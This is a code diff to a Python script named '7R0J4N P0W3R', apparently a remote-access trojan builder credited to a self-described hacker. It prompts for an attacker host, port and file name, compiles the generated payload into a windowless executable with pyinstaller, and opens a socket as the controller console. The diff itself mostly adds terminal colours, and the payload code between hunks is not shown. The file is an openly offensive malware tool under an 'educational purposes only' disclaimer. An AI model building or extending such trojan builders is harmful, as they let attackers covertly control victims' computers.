@@ -4,15 +4,12 @@ import os
 import sys
 import time
 import pyfiglet
+from colorama import Fore
 
-if sys.platform in ["linux","linux2"]:
-    os.system("figlet 7R0J4N P0W3R")
-
-else:
-	os.system("pyfiglet 7R0J4N P0W3R")
-print("""
+os.system("pyfiglet 7R0J4N P0W3R")
+print(f"""{Fore.GREEN}
 ______________________________________________________________________________________
- * This Program was made by a MYANMAR Hacker called Swam Htet Aung(4L13N) *
+ * This Program was made by a MYANMAR Hacker called Swam Htet Aung(4L13N) *{Fore.RED}
 
  [!] Developer is not responsible for any misuse or damage caused by 7R0J4N P0W3R[!]
  [!] Just For fun and educational purposes only[!]
@@ -21,11 +18,13 @@ ________________________________________________________________________________
 --------------------------------------------------------------------------------------
 
     """)
+print(Fore.GREEN)
 print("This program need pyinstaller!")
 print("If you don't have pyinstaller please install pyinstaller first!!!!")
 hostl = input("[+]Enter Host ")
 portl = int(input("[+]Enter Port "))
 fn = input("[+]Enter File Name To Create: ")
+print(Fore.WHITE)
 ft = (".py") # file type
 
 fnn = fn + ft
@@ -211,6 +210,7 @@ os.system(f"pyinstaller --onefile -w {fnn}")
 ###### console  #######
 
 print("----------------------------------------------------------------------")
+print(Fore.GREEN)
 # starting
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # creating socket
 host = hostl
